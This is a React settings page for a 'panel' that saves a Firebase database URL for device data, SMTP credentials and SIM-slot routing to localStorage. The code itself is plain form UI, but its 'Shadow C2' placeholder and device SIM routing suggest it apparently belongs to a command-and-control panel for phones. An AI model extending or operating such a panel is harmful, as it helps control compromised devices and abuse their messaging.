'use client';

import { useEffect, useState } from 'react';
import { Save, Plus, Trash2, CheckCircle2, Database, Mail, CreditCard } from 'lucide-react';
import { useAuth } from '@/components/auth-provider';

interface SmtpConfig {
  host: string;
  port: string;
  username: string;
  password: string;
  fromName: string;
  fromEmail: string;
  enabled: boolean;
}
interface SimSlot {
  id: string;
  name: string;
  simSlot: 0 | 1;
  operator: string;
  priority: number;
  active: boolean;
}

const SMTP_DEFAULT: SmtpConfig = { host: '', port: '587', username: '', password: '', fromName: '', fromEmail: '', enabled: false };
const SLOTS_DEFAULT: SimSlot[] = [
  { id: '1', name: 'Primary SIM', simSlot: 0, operator: '', priority: 1, active: true },
  { id: '2', name: 'Secondary SIM', simSlot: 1, operator: '', priority: 2, active: true },
];

function load<T>(key: string, fallback: T): T {
  try { const v = localStorage.getItem(key); return v ? JSON.parse(v) as T : fallback; } catch { return fallback; }
}
function save(key: string, val: unknown) {
  try { localStorage.setItem(key, JSON.stringify(val)); } catch { /* */ }
}

function Toast({ msg }: { msg: string }) {
  return msg ? (
    <div className="fixed bottom-6 right-6 z-50 flex items-center gap-2 bg-emerald-600 text-white px-4 py-2.5 rounded-lg shadow-lg text-sm font-medium animate-fade-in">
      <CheckCircle2 className="w-4 h-4" />
      {msg}
    </div>
  ) : null;
}

export default function SettingsPage() {
  const { user } = useAuth();
  const [rtdbUrl, setRtdbUrl] = useState('');
  const [smtp, setSmtp] = useState<SmtpConfig>(SMTP_DEFAULT);
  const [slots, setSlots] = useState<SimSlot[]>(SLOTS_DEFAULT);
  const [toast, setToast] = useState('');

  useEffect(() => {
    setRtdbUrl(localStorage.getItem('panel_rtdb_url') ?? '');
    setSmtp(load('panel_smtp', SMTP_DEFAULT));
    setSlots(load('panel_slots', SLOTS_DEFAULT));
  }, []);

  function showToast(msg: string) {
    setToast(msg);
    setTimeout(() => setToast(''), 2500);
  }

  function saveRtdb() {
    const cleaned = rtdbUrl.trim().replace(/\/$/, '');
    localStorage.setItem('panel_rtdb_url', cleaned);
    setRtdbUrl(cleaned);
    showToast('Firebase URL saved');
  }

  function saveSmtp() {
    save('panel_smtp', smtp);
    showToast('SMTP settings saved');
  }

  function addSlot() {
    const newSlot: SimSlot = {
      id: Date.now().toString(),
      name: `SIM Slot ${slots.length + 1}`,
      simSlot: slots.length % 2 === 0 ? 0 : 1,
      operator: '',
      priority: slots.length + 1,
      active: true,
    };
    const updated = [...slots, newSlot];
    setSlots(updated);
    save('panel_slots', updated);
  }

  function updateSlot(id: string, patch: Partial<SimSlot>) {
    const updated = slots.map(s => s.id === id ? { ...s, ...patch } : s);
    setSlots(updated);
    save('panel_slots', updated);
  }

  function deleteSlot(id: string) {
    const updated = slots.filter(s => s.id !== id);
    setSlots(updated);
    save('panel_slots', updated);
  }

  return (
    <div className="max-w-2xl space-y-6 animate-fade-in">
      <div>
        <h1 className="text-2xl font-bold text-slate-900 dark:text-white">Settings</h1>
        <p className="text-sm text-slate-500 dark:text-slate-400 mt-0.5">Panel configuration</p>
      </div>

      {/* Firebase RTDB */}
      <div className="card p-5 space-y-4">
        <div className="flex items-center gap-2.5 pb-3 border-b border-slate-100 dark:border-slate-700/50">
          <div className="w-8 h-8 rounded-lg bg-orange-50 dark:bg-orange-950 flex items-center justify-center">
            <Database className="w-4 h-4 text-orange-500" />
          </div>
          <div>
            <p className="text-sm font-semibold text-slate-900 dark:text-white">Firebase RTDB</p>
            <p className="text-xs text-slate-400">Realtime Database URL for device data</p>
          </div>
        </div>
        <div className="space-y-1.5">
          <label className="text-xs font-medium text-slate-500 dark:text-slate-400 uppercase tracking-wide">Database URL</label>
          <input
            type="url"
            value={rtdbUrl}
            onChange={e => setRtdbUrl(e.target.value)}
            placeholder="https://your-project-default-rtdb.firebaseio.com"
            className="input w-full font-mono text-sm"
          />
          <p className="text-[11px] text-slate-400">Firebase Console → Project → Realtime Database → Copy URL</p>
        </div>
        <button onClick={saveRtdb} className="btn-primary gap-2 text-sm">
          <Save className="w-4 h-4" /> Save URL
        </button>
      </div>

      {/* SMTP */}
      <div className="card p-5 space-y-4">
        <div className="flex items-center justify-between pb-3 border-b border-slate-100 dark:border-slate-700/50">
          <div className="flex items-center gap-2.5">
            <div className="w-8 h-8 rounded-lg bg-blue-50 dark:bg-blue-950 flex items-center justify-center">
              <Mail className="w-4 h-4 text-blue-500" />
            </div>
            <div>
              <p className="text-sm font-semibold text-slate-900 dark:text-white">SMTP Server</p>
              <p className="text-xs text-slate-400">Email delivery configuration</p>
            </div>
          </div>
          <label className="flex items-center gap-2 cursor-pointer">
            <span className="text-xs text-slate-500">Enable</span>
            <div
              onClick={() => setSmtp(s => ({ ...s, enabled: !s.enabled }))}
              className={`w-9 h-5 rounded-full transition-colors cursor-pointer ${smtp.enabled ? 'bg-brand-600' : 'bg-slate-200 dark:bg-slate-700'}`}
            >
              <div className={`w-4 h-4 rounded-full bg-white shadow-sm transition-transform mt-0.5 ${smtp.enabled ? 'translate-x-4.5 ml-0.5' : 'translate-x-0.5'}`} />
            </div>
          </label>
        </div>

        <div className="grid grid-cols-2 gap-3">
          <div className="space-y-1">
            <label className="text-xs font-medium text-slate-500 uppercase tracking-wide">Host</label>
            <input type="text" value={smtp.host} onChange={e => setSmtp(s => ({ ...s, host: e.target.value }))} placeholder="smtp.gmail.com" className="input w-full text-sm" />
          </div>
          <div className="space-y-1">
            <label className="text-xs font-medium text-slate-500 uppercase tracking-wide">Port</label>
            <input type="text" value={smtp.port} onChange={e => setSmtp(s => ({ ...s, port: e.target.value }))} placeholder="587" className="input w-full text-sm" />
          </div>
          <div className="space-y-1">
            <label className="text-xs font-medium text-slate-500 uppercase tracking-wide">Username</label>
            <input type="text" value={smtp.username} onChange={e => setSmtp(s => ({ ...s, username: e.target.value }))} placeholder="user@example.com" className="input w-full text-sm" />
          </div>
          <div className="space-y-1">
            <label className="text-xs font-medium text-slate-500 uppercase tracking-wide">Password</label>
            <input type="password" value={smtp.password} onChange={e => setSmtp(s => ({ ...s, password: e.target.value }))} placeholder="••••••••" className="input w-full text-sm" />
          </div>
          <div className="space-y-1">
            <label className="text-xs font-medium text-slate-500 uppercase tracking-wide">From Name</label>
            <input type="text" value={smtp.fromName} onChange={e => setSmtp(s => ({ ...s, fromName: e.target.value }))} placeholder="Shadow C2" className="input w-full text-sm" />
          </div>
          <div className="space-y-1">
            <label className="text-xs font-medium text-slate-500 uppercase tracking-wide">From Email</label>
            <input type="email" value={smtp.fromEmail} onChange={e => setSmtp(s => ({ ...s, fromEmail: e.target.value }))} placeholder="noreply@example.com" className="input w-full text-sm" />
          </div>
        </div>
        <button onClick={saveSmtp} className="btn-primary gap-2 text-sm">
          <Save className="w-4 h-4" /> Save SMTP
        </button>
      </div>

      {/* SIM Slots */}
      <div className="card p-5 space-y-4">
        <div className="flex items-center justify-between pb-3 border-b border-slate-100 dark:border-slate-700/50">
          <div className="flex items-center gap-2.5">
            <div className="w-8 h-8 rounded-lg bg-violet-50 dark:bg-violet-950 flex items-center justify-center">
              <CreditCard className="w-4 h-4 text-violet-500" />
            </div>
            <div>
              <p className="text-sm font-semibold text-slate-900 dark:text-white">SIM Slots</p>
              <p className="text-xs text-slate-400">Manage device SIM slot routing</p>
            </div>
          </div>
          <button onClick={addSlot} className="btn-secondary gap-1.5 text-xs py-1.5 px-3">
            <Plus className="w-3.5 h-3.5" /> Add Slot
          </button>
        </div>

        <div className="space-y-2">
          {slots.map(slot => (
            <div key={slot.id} className="flex items-center gap-3 p-3 rounded-lg bg-slate-50 dark:bg-slate-800/50 border border-slate-100 dark:border-slate-700/50">
              <div className="flex-1 grid grid-cols-3 gap-2">
                <input
                  type="text"
                  value={slot.name}
                  onChange={e => updateSlot(slot.id, { name: e.target.value })}
                  className="input text-xs py-1.5"
                  placeholder="Slot name"
                />
                <select
                  value={slot.simSlot}
                  onChange={e => updateSlot(slot.id, { simSlot: Number(e.target.value) as 0 | 1 })}
                  className="input text-xs py-1.5"
                >
                  <option value={0}>SIM 1</option>
                  <option value={1}>SIM 2</option>
                </select>
                <input
                  type="text"
                  value={slot.operator}
                  onChange={e => updateSlot(slot.id, { operator: e.target.value })}
                  className="input text-xs py-1.5"
                  placeholder="Operator"
                />
              </div>
              <label className="flex items-center gap-1.5 flex-shrink-0 cursor-pointer">
                <input
                  type="checkbox"
                  checked={slot.active}
                  onChange={e => updateSlot(slot.id, { active: e.target.checked })}
                  className="w-3.5 h-3.5 accent-brand-600"
                />
                <span className="text-xs text-slate-500">Active</span>
              </label>
              <button onClick={() => deleteSlot(slot.id)} className="p-1 text-slate-400 hover:text-red-500 transition-colors flex-shrink-0">
                <Trash2 className="w-4 h-4" />
              </button>
            </div>
          ))}
        </div>
      </div>

      {/* Account */}
      <div className="card p-5 space-y-3">
        <div className="pb-3 border-b border-slate-100 dark:border-slate-700/50">
          <p className="text-sm font-semibold text-slate-900 dark:text-white">Account</p>
        </div>
        <div className="grid grid-cols-2 gap-3">
          <div className="space-y-1">
            <label className="text-xs font-medium text-slate-500 uppercase tracking-wide">Email</label>
            <input type="text" value={user?.email ?? ''} readOnly className="input w-full text-sm bg-slate-50 dark:bg-slate-800 cursor-default" />
          </div>
          <div className="space-y-1">
            <label className="text-xs font-medium text-slate-500 uppercase tracking-wide">UID</label>
            <input type="text" value={user?.uid ?? ''} readOnly className="input w-full text-sm font-mono text-xs bg-slate-50 dark:bg-slate-800 cursor-default" />
          </div>
        </div>
      </div>

      <Toast msg={toast} />
    </div>
  );
}
